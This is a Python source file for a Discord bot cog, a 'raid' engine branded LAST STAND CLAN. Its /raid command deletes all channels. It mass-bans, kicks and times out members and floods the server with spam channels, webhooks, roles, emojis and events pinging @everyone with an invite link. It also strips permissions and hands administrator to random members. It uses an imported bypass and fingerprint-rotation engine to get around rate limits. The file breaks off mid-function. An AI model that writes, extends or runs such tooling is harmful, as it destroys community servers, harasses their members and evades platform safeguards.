"""
raid.py — LAST STAND CLAN | Absolute Maximum Destruction Engine

/raid fires all phases simultaneously.
chaos=True  → enables every extra attack vector at once (default True)
chaos=False → core destruction only: nuke, channels, webhooks, bans, kicks,
              timeouts, nicknames, role flood, server rename, perm strip
"""

import asyncio
import datetime
import random
import string
import struct
import zlib

import discord
from discord import app_commands
from discord.ext import commands

from utils.bypass import (
    BypassEngine, FingerprintRotator,
    ROUTE_CHANNEL_DELETE, ROUTE_CHANNEL_CREATE,
    ROUTE_MEMBER_BAN, ROUTE_MEMBER_KICK, ROUTE_MEMBER_EDIT, ROUTE_MEMBER_TIMEOUT,
    ROUTE_WEBHOOK_CREATE, ROUTE_WEBHOOK_SEND, ROUTE_WEBHOOK_DELETE,
    ROUTE_ROLE_CREATE, ROUTE_ROLE_ASSIGN, ROUTE_ROLE_DELETE,
    ROUTE_GUILD_EDIT, ROUTE_EMOJI, ROUTE_EVENT_CREATE,
    ROUTE_INTEGRATION, ROUTE_OVERWRITE, ROUTE_THREAD,
    ROUTE_INVITE, ROUTE_PRUNE,
)
from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG   = "LAST STAND CLAN"
RAID_SHORT = "LSC"
RAID_LINK  = "https://discord.gg/s59zWvzK6c"
RAID_NAME  = f"RAIDED BY {RAID_TAG}"

# ── Scale constants ────────────────────────────────────────────────────────────
NEW_TEXT_CHANNELS  = 100
NEW_VOICE_CHANNELS = 60
NEW_CATEGORIES     = 20
NEW_ROLES          = 250
WEBHOOKS_PER       = 15
MSGS_PER_HOOK      = 100
MAX_EMOJIS         = 100
MAX_EVENTS         = 100
WAVE_COUNT         = 10

# ── Concurrency semaphores ────────────────────────────────────────────────────
SEM_DELETE    = 50
SEM_CREATE    = 40
SEM_BAN       = 40
SEM_KICK      = 40
SEM_NICK      = 40
SEM_TIMEOUT   = 40
SEM_ROLE      = 20
SEM_OVERWRITE = 15


def _rand_str(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _tiny_png() -> bytes:
    r, g, b = random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)

    def chunk(tag: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(tag + data) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", crc)

    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(b"\x00" + bytes([r, g, b])))
        + chunk(b"IEND", b"")
    )


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ ABSOLUTE MAXIMUM DESTRUCTION — {RAID_TAG}",
    )
    @app_commands.describe(
        intensity="Speed 1–10. Default 10.",
        chaos="True = all extra attacks (emoji, events, waves, voice, etc). False = core only. Default True.",
        nuke_channels="Delete all existing channels first. Default True.",
        mass_ban="Ban all eligible members. Default True.",
        mass_kick="Kick all eligible members. Default True.",
        mass_timeout="Timeout all members 28 days. Default True.",
        skip_admins="Skip members with Administrator. Default False.",
        new_channels="Text channels to create. Default 100.",
        webhooks_per_channel="Webhooks per channel. Default 15.",
        msgs_per_webhook="Messages per webhook. Default 100.",
        mass_nickname="Rename every member. Default True.",
        strip_permissions="Strip all @everyone perms. Default True.",
        role_flood="Create 250 roles and assign to everyone. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        chaos: bool = True,
        nuke_channels: bool = True,
        mass_ban: bool = True,
        mass_kick: bool = True,
        mass_timeout: bool = True,
        skip_admins: bool = False,
        new_channels: int = NEW_TEXT_CHANNELS,
        webhooks_per_channel: int = WEBHOOKS_PER,
        msgs_per_webhook: int = MSGS_PER_HOOK,
        mass_nickname: bool = True,
        strip_permissions: bool = True,
        role_flood: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        # Defer early — we need to chunk members which takes a moment
        await interaction.response.defer()

        # Force-fetch all members so guild.members is complete
        try:
            await guild.chunk(cache=True)
        except Exception:
            pass

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.bypass.configure(intensity)
        bot_state.active_simulation = "raid"

        me = guild.me
        members      = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
        all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
        eligible     = [m for m in members if not skip_admins or not m.guild_permissions.administrator]
        # Only target members the bot's role is actually above (prevents silent 403s)
        bannable     = [m for m in eligible if m.top_role < me.top_role]
        ban_targets  = bannable if mass_ban else []
        kick_targets = bannable if mass_kick else []
        to_timeout   = [m for m in members if m.top_role < me.top_role] if mass_timeout else []
        nick_targets = members if mass_nickname else []
        original_chs = list(guild.channels)
        total_streams = new_channels * webhooks_per_channel

        chaos_label = "✅ ALL VECTORS" if chaos else "❌ core only"
        await interaction.followup.send(
            f"☠️ **{RAID_TAG} — RAID LAUNCHING** ☠️\n"
            f"```\n"
            f"Intensity : {intensity}/10\n"
            f"Chaos mode: {chaos_label}\n"
            f"Nuke      : {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
            f"Channels  : ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice\n"
            f"Webhooks  : ✅ {total_streams} streams\n"
            f"Ban       : {'✅ ' + str(len(ban_targets)) + ' targets' if mass_ban else '❌'}\n"
            f"Kick      : {'✅ ' + str(len(kick_targets)) + ' targets' if mass_kick else '❌'}\n"
            f"Timeout   : {'✅ ' + str(len(to_timeout)) + ' targets' if mass_timeout else '❌'}\n"
            f"Nickname  : {'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}\n"
            f"Roles     : {'✅ ' + str(NEW_ROLES) + ' roles' if role_flood else '❌'}\n"
            f"```\n"
            f"`/stop` cancels everything instantly."
        )

        # Pre-raid sabotage (chaos only) — runs first as a background task
        if chaos:
            t = asyncio.create_task(
                self._phase_pre_raid(guild, all_bots)
            )
            bot_state.add_task(t)

        phases = [
            self._phase_nuke_and_build(
                guild, original_chs, new_channels, webhooks_per_channel,
                msgs_per_webhook, nuke_channels,
                invite_flood=chaos, embed_storm=chaos,
            ),
            self._phase_ban(guild, ban_targets),
            self._phase_kick(guild, kick_targets),
            self._phase_timeout(to_timeout),
            self._phase_nickname(nick_targets),
            self._phase_server(guild, strip_permissions),
        ]

        if chaos:
            phases += [
                self._phase_voice_chaos(guild),
                self._phase_mention_burst(guild),
                self._phase_audit_flood(guild),
                self._phase_prune(guild),
                self._phase_integration_wipe(guild),
                self._phase_sticker_wipe(guild),
                self._phase_overwrite_storm(guild),
            ]

        if role_flood:
            phases.append(self._phase_roles(guild, perm_chaos=chaos))
        if chaos:
            phases.append(self._phase_emoji_wipe_flood(guild))
            phases.append(self._phase_event_flood(guild))
            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm=True))

        for coro in phases:
            t = asyncio.create_task(coro)
            bot_state.add_task(t)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 00 — PRE-RAID SABOTAGE (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_pre_raid(
        self, guild: discord.Guild, bots: list[discord.Member]
    ) -> None:
        try:
            wipe_tasks = [self._wipe_channel_webhooks(ch) for ch in guild.text_channels]
            await asyncio.gather(*wipe_tasks, return_exceptions=True)

            sem = asyncio.Semaphore(SEM_KICK)
            await asyncio.gather(
                *[self._kick_bot(guild, b, sem) for b in bots],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _wipe_channel_webhooks(self, channel: discord.TextChannel) -> None:
        try:
            webhooks = await channel.webhooks()
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_WEBHOOK_DELETE, lambda wh=wh: wh.delete(), bot_state.stop_event
                ) for wh in webhooks],
                return_exceptions=True,
            )
        except discord.HTTPException:
            pass

    async def _kick_bot(
        self, guild: discord.Guild, bot: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_KICK,
                lambda: guild.kick(bot, reason=f"Bot purge — {RAID_TAG}"),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 01 + 03 + 04 + 05 + 06 + 13 — Nuke → Build → Webhook Army
    # Channels are created in batches of 4. Each batch immediately spawns
    # webhooks as background tasks so spam starts while channels are still
    # being created.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nuke_and_build(
        self,
        guild: discord.Guild,
        originals: list,
        n_text: int,
        webhooks_per: int,
        msgs_per: int,
        nuke: bool,
        invite_flood: bool,
        embed_storm: bool,
    ) -> None:
        se = bot_state.stop_event
        try:
            if nuke:
                sem_del = asyncio.Semaphore(SEM_DELETE)
                await asyncio.gather(
                    *[self._delete_channel(ch, sem_del) for ch in originals],
                    return_exceptions=True,
                )

            if se.is_set():
                return

            # Discord's guild channel-create rate limit is ~2/second.
            # BATCH=2, BATCH_PAUSE=2.0 keeps us under that limit so every
            # create lands instead of cascading into 429 exhaustion.
            BATCH       = 2
            BATCH_PAUSE = 2.0

            async def _create_and_flood(idx: int) -> None:
                sem1 = asyncio.Semaphore(1)
                ch = await self._create_text_ch(guild, idx, sem1)
                if ch and not se.is_set():
                    bot_state.add_task(asyncio.create_task(
                        self._webhook_army(ch, webhooks_per, msgs_per, embed_storm)
                    ))
                    bot_state.add_task(asyncio.create_task(
                        self._thread_double_flood(ch, msgs_per)
                    ))
                    if invite_flood:
                        bot_state.add_task(asyncio.create_task(self._create_invite(ch)))

            for batch_start in range(0, n_text, BATCH):
                if se.is_set():
                    break
                batch = range(batch_start, min(batch_start + BATCH, n_text))
                await asyncio.gather(
                    *[_create_and_flood(i) for i in batch],
                    return_exceptions=True,
                )
                if batch_start + BATCH < n_text:
                    await asyncio.sleep(BATCH_PAUSE)

            async def _create_vc(idx: int) -> None:
                sem1 = asyncio.Semaphore(1)
                ch = await self._create_voice_ch(guild, idx, sem1)
                if ch and invite_flood and not se.is_set():
                    bot_state.add_task(asyncio.create_task(self._create_invite(ch)))

            for batch_start in range(0, NEW_VOICE_CHANNELS, BATCH):
                if se.is_set():
                    break
                batch = range(batch_start, min(batch_start + BATCH, NEW_VOICE_CHANNELS))
                await asyncio.gather(
                    *[_create_vc(i) for i in batch],
                    return_exceptions=True,
                )
                await asyncio.sleep(BATCH_PAUSE)

            for i in range(0, NEW_CATEGORIES, BATCH):
                if se.is_set():
                    break
                batch = range(i, min(i + BATCH, NEW_CATEGORIES))
                sem_b = asyncio.Semaphore(BATCH)
                await asyncio.gather(
                    *[self._create_category(guild, j, sem_b) for j in batch],
                    return_exceptions=True,
                )
                await asyncio.sleep(BATCH_PAUSE)

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid" and not bot_state.is_running():
                bot_state.active_simulation = None

    async def _delete_channel(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), bot_state.stop_event
            )

    async def _create_category(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            return await bot_state.bypass.execute(
                ROUTE_CHANNEL_CREATE,
                lambda: guild.create_category(f"{RAID_NAME} {idx}"),
                bot_state.stop_event,
            )

    async def _create_text_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            name = bot_state.bypass.fp.channel_name("lsc", idx)
            return await bot_state.bypass.execute(
                ROUTE_CHANNEL_CREATE,
                lambda n=name: guild.create_text_channel(
                    n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
                ),
                bot_state.stop_event,
            )

    async def _create_voice_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            name = bot_state.bypass.fp.channel_name("vc", idx)
            return await bot_state.bypass.execute(
                ROUTE_CHANNEL_CREATE,
                lambda n=name: guild.create_voice_channel(n),
                bot_state.stop_event,
            )

    async def _create_invite(self, channel: discord.abc.GuildChannel) -> None:
        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel)):
            await bot_state.bypass.execute(
                ROUTE_INVITE,
                lambda c=channel: c.create_invite(max_age=0, max_uses=0),
                bot_state.stop_event,
            )

    # ── Webhook army ───────────────────────────────────────────────────────────
    # All webhooks × all messages are built as a single flat coroutine list and
    # fired with one asyncio.gather — no sequential loops, no drain pauses.
    # The bypass engine's per-route 429 recovery handles rate limits without
    # blocking other sends. Result: max Discord throughput from the first second.
    async def _webhook_army(
        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int, embed_storm: bool
    ) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event

        # Create all webhooks concurrently
        wh_results = await asyncio.gather(
            *[bp.execute(
                ROUTE_WEBHOOK_CREATE,
                lambda: channel.create_webhook(name=bp.fp.username()),
                se,
            ) for _ in range(webhooks_per)],
            return_exceptions=True,
        )
        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]

        if not webhooks:
            await self._direct_spam(channel, msgs_per)
            return

        # Flatten ALL sends (all webhooks × all messages) into one gather call.
        # This fires every message from every webhook simultaneously — the bypass
        # engine's per-route isolation ensures 429s on one webhook don't pause others.
        all_sends = []
        for i, wh in enumerate(webhooks):
            use_embed = embed_storm and i % 3 == 0
            for j in range(msgs_per):
                if se.is_set():
                    break
                if use_embed:
                    embed = bp.fp.embed(j)
                    all_sends.append(bp.execute(
                        ROUTE_WEBHOOK_SEND,
                        lambda wh=wh, em=embed: wh.send(
                            content=f"@everyone @here {RAID_LINK}",
                            embed=em,
                            username=bp.fp.username(),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        ),
                        se,
                    ))
                else:
                    all_sends.append(bp.execute(
                        ROUTE_WEBHOOK_SEND,
                        lambda wh=wh: wh.send(
                            bp.fp.message(),
                            username=bp.fp.username(),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        ),
                        se,
                    ))

        await asyncio.gather(*all_sends, return_exceptions=True)

    # ── Thread flood ───────────────────────────────────────────────────────────
    async def _thread_double_flood(self, channel: discord.TextChannel, count: int) -> None:
        await asyncio.gather(
            self._thread_spam(channel, count),
            self._thread_spam(channel, count),
            return_exceptions=True,
        )

    async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
        bp   = bot_state.bypass
        se   = bot_state.stop_event
        name = bp.fp.channel_name("thread", random.randint(0, 999))
        thread = await bp.execute(
            ROUTE_THREAD,
            lambda n=name: channel.create_thread(
                name=n, type=discord.ChannelType.public_thread
            ),
            se,
        )
        if not thread:
            return
        factories = [
            lambda t=thread: t.send(
                bp.fp.message(),
                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
            )
            for _ in range(count)
        ]
        await bp.burst_drain_execute(
            ROUTE_WEBHOOK_SEND, factories, se, drain_every=25, drain_time=0.2
        )

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        bp = bot_state.bypass
        factories = [
            lambda c=channel: c.send(
                bp.fp.message(),
                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
            )
            for _ in range(count)
        ]
        await bp.burst_drain_execute(
            ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event, drain_every=20
        )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 02 — SERVER TAKEOVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild, strip_perms: bool) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event
        try:
            await asyncio.gather(
                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(name=RAID_NAME), se),
                bp.execute(
                    ROUTE_GUILD_EDIT,
                    lambda: guild.edit(system_channel=None, afk_channel=None),
                    se,
                ),
                (bp.execute(
                    ROUTE_ROLE_ASSIGN,
                    lambda: guild.default_role.edit(permissions=discord.Permissions.none()),
                    se,
                ) if strip_perms else asyncio.sleep(0)),
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 07 — ROLE FLOOD + PERM CHAOS
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_roles(self, guild: discord.Guild, perm_chaos: bool) -> None:
        bp    = bot_state.bypass
        se    = bot_state.stop_event
        sem_c = asyncio.Semaphore(SEM_CREATE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, i, sem_c) for i in range(NEW_ROLES)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if se.is_set():
                await self._cleanup_roles(created)
                return

            sem_a = asyncio.Semaphore(SEM_ROLE)
            assign_tasks = [
                self._assign_role(m, r, sem_a)
                for m in guild.members if not m.bot
                for r in created[:60]
            ]
            await asyncio.gather(*assign_tasks, return_exceptions=True)

            if perm_chaos:
                try:
                    admin_role = await guild.create_role(
                        name=bp.fp.role_name(999),
                        permissions=discord.Permissions(administrator=True),
                        colour=discord.Colour.red(),
                        hoist=True,
                    )
                    non_bots = [m for m in guild.members if not m.bot]
                    targets  = random.sample(non_bots, min(10, len(non_bots)))
                    await asyncio.gather(
                        *[bp.execute(
                            ROUTE_ROLE_ASSIGN,
                            lambda m=m, r=admin_role: m.add_roles(r),
                            se,
                        ) for m in targets],
                        return_exceptions=True,
                    )
                except discord.HTTPException:
                    pass

            await self._cleanup_roles(created)
        except asyncio.CancelledError:
            pass

    async def _create_role(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            name = bot_state.bypass.fp.role_name(idx)
            return await bot_state.bypass.execute(
                ROUTE_ROLE_CREATE,
                lambda n=name: guild.create_role(
                    name=n,
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                    mentionable=True,
                ),
                bot_state.stop_event,
            )

    async def _assign_role(
        self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_ROLE_ASSIGN,
                lambda m=member, r=role: m.add_roles(r),
                bot_state.stop_event,
            )

    async def _cleanup_roles(self, roles: list[discord.Role]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_role(r, sem) for r in roles], return_exceptions=True
        )

    async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_ROLE_DELETE, lambda r=role: r.delete(), bot_state.stop_event
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 08 — BAN + KICK + TIMEOUT
    # Role hierarchy is checked before calling so there are no silent 403s.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_BAN)
        try:
            await asyncio.gather(
                *[self._ban_one(guild, m, sem) for m in members], return_exceptions=True
            )
        except asyncio.CancelledError:
            pass

    async def _ban_one(self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_BAN,
                lambda: guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0),
                bot_state.stop_event,
            )

    async def _phase_kick(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_KICK)
        try:
            await asyncio.gather(
                *[self._kick_one(guild, m, sem) for m in members], return_exceptions=True
            )
        except asyncio.CancelledError:
            pass

    async def _kick_one(self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_KICK,
                lambda: guild.kick(m, reason=f"Raided by {RAID_TAG}"),
                bot_state.stop_event,
            )

    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem      = asyncio.Semaphore(SEM_TIMEOUT)
        duration = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, duration, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_TIMEOUT,
                lambda: m.timeout(dur, reason=f"Raided by {RAID_TAG}"),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 09 — MASS NICKNAME
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem  = asyncio.Semaphore(SEM_NICK)
        NICKS = [
            f"{RAID_SHORT} Raider", RAID_TAG, "RAIDED", f"{RAID_SHORT} Member",
            "Server Owned", "GG no re", "LSC Was Here", "PWNED", "Raided",
        ]
        try:
            await asyncio.gather(
                *[self._set_nick(m, random.choice(NICKS), sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _set_nick(self, m: discord.Member, nick: str, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_EDIT,
                lambda: m.edit(nick=nick),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 11 — EMOJI WIPE + FLOOD (chaos only)
    # Note: emoji slots depend on server boost level. Failures are silenced.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_emoji_wipe_flood(self, guild: discord.Guild) -> None:
        try:
            sem_del = asyncio.Semaphore(SEM_DELETE)
            await asyncio.gather(
                *[self._delete_emoji(e, sem_del) for e in guild.emojis],
                return_exceptions=True,
            )
            sem_c = asyncio.Semaphore(SEM_CREATE)
            await asyncio.gather(
                *[self._create_emoji(guild, i, sem_c) for i in range(MAX_EMOJIS)],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_emoji(self, emoji: discord.Emoji, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_EMOJI, lambda e=emoji: e.delete(), bot_state.stop_event
            )

    async def _create_emoji(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore) -> None:
        async with sem:
            name = f"{RAID_SHORT}_{idx}_{_rand_str(3)}"
            img  = _tiny_png()
            await bot_state.bypass.execute(
                ROUTE_EMOJI,
                lambda n=name, i=img: guild.create_custom_emoji(name=n, image=i),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 12 — STICKER WIPE (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_sticker_wipe(self, guild: discord.Guild) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_sticker(s, sem) for s in guild.stickers],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_sticker(self, s: discord.GuildSticker, sem: asyncio.Semaphore) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_EMOJI, lambda st=s: st.delete(), bot_state.stop_event
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 14 — SCHEDULED EVENT FLOOD (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_event_flood(self, guild: discord.Guild) -> None:
        se = bot_state.stop_event
        try:
            start = discord.utils.utcnow() + datetime.timedelta(minutes=1)
            end   = start + datetime.timedelta(hours=1)
            sem   = asyncio.Semaphore(SEM_CREATE)
            await asyncio.gather(
                *[self._create_event(guild, i, start, end, sem) for i in range(MAX_EVENTS)],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _create_event(
        self, guild: discord.Guild, idx: int, start, end, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            name = f"{RAID_TAG} — {idx} — {_rand_str(4)}"
            await bot_state.bypass.execute(
                ROUTE_EVENT_CREATE,
                lambda n=name: guild.create_scheduled_event(
                    name=n,
                    description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                    start_time=start,
                    end_time=end,
                    location=RAID_LINK,
                    entity_type=discord.EntityType.external,
                    privacy_level=discord.PrivacyLevel.guild_only,
                ),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 16 — OVERWRITE STORM (chaos only)
    # Reads guild.text_channels at call time — by then channels exist in cache.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_overwrite_storm(self, guild: discord.Guild) -> None:
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(SEM_OVERWRITE)
        try:
            # Small delay so newly-created channels are in the cache
            await asyncio.sleep(3)
            tasks = []
            for ch in guild.text_channels:
                for role in list(guild.roles)[:20]:
                    tasks.append(self._set_overwrite(ch, role, sem))
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _set_overwrite(
        self, ch: discord.TextChannel, target: discord.Role, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            ow = discord.PermissionOverwrite()
            ow.send_messages = random.choice([True, False, None])
            ow.view_channel  = random.choice([True, False, None])
            ow.read_messages = random.choice([True, False, None])
            await bot_state.bypass.execute(
                ROUTE_OVERWRITE,
                lambda c=ch, t=target, o=ow: c.set_permissions(t, overwrite=o),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 17 — VOICE CHAOS (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_voice_chaos(self, guild: discord.Guild) -> None:
        try:
            vcs      = guild.voice_channels
            in_voice = [m for m in guild.members if m.voice and m.voice.channel and not m.bot]
            if not in_voice or not vcs:
                return
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_MEMBER_EDIT,
                    lambda m=member, c=random.choice(vcs): m.move_to(c),
                    bot_state.stop_event,
                ) for member in in_voice],
                return_exceptions=True,
            )
            await asyncio.sleep(0.5)
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_MEMBER_EDIT,
                    lambda m=member: m.edit(deafen=True, mute=True),
                    bot_state.stop_event,
                ) for member in in_voice],
                return_exceptions=True,
            )
            await asyncio.sleep(0.3)
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_MEMBER_EDIT,
                    lambda m=member: m.move_to(None),
                    bot_state.stop_event,
                ) for member in in_voice],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 18 — MENTION BURST (chaos only)
    # Waits for channels to be created before reading the channel list.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_mention_burst(self, guild: discord.Guild) -> None:
        try:
            await asyncio.sleep(5)   # let channel creation populate the cache
            channels = guild.text_channels
            if not channels:
                return
            await asyncio.gather(
                *[self._mention_burst_channel(ch, 20) for ch in channels],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _mention_burst_channel(self, ch: discord.TextChannel, count: int) -> None:
        bp = bot_state.bypass
        factories = [
            lambda c=ch: c.send(
                bp.fp.message(),
                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
            )
            for _ in range(count)
        ]
        await bp.burst_drain_execute(ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 19 — AUDIT FLOOD (chaos only)
    # Reduced from 48 renames to 12 — more than enough to flood the log
    # without blowing through the guild-edit rate limit bucket in one second.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_audit_flood(self, guild: discord.Guild) -> None:
        bp    = bot_state.bypass
        names = [
            RAID_NAME, f"{RAID_TAG} II", f"{RAID_TAG} III",
            f"{RAID_TAG} IV", RAID_NAME, f"{RAID_TAG} FINAL",
        ]
        try:
            for name in names * 2:   # 12 renames total
                if bot_state.stop_event.is_set():
                    break
                n = name
                await bp.execute(
                    ROUTE_GUILD_EDIT,
                    lambda n=n: guild.edit(name=n),
                    bot_state.stop_event,
                )
                await asyncio.sleep(1.5)   # guild name rate limit: ~2/10 s
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 20 — PRUNE STRIKE (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_prune(self, guild: discord.Guild) -> None:
        await bot_state.bypass.execute(
            ROUTE_PRUNE,
            lambda: guild.prune_members(
                days=1, compute_prune_count=False, reason=f"Raided by {RAID_TAG}"
            ),
            bot_state.stop_event,
        )

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 21 — INTEGRATION WIPE (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
        try:
            integrations = await guild.integrations()
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_INTEGRATION,
                    lambda i=intg: i.delete(reason=f"Raided by {RAID_TAG}"),
                    bot_state.stop_event,
                ) for intg in integrations],
                return_exceptions=True,
            )
        except (discord.HTTPException, asyncio.CancelledError):
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 23 — WAVE REPEAT + GHOST MODE (chaos only)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_wave_repeat(
        self, guild: discord.Guild, msgs_per: int, embed_storm: bool
    ) -> None:
        bp = bot_state.bypass
        try:
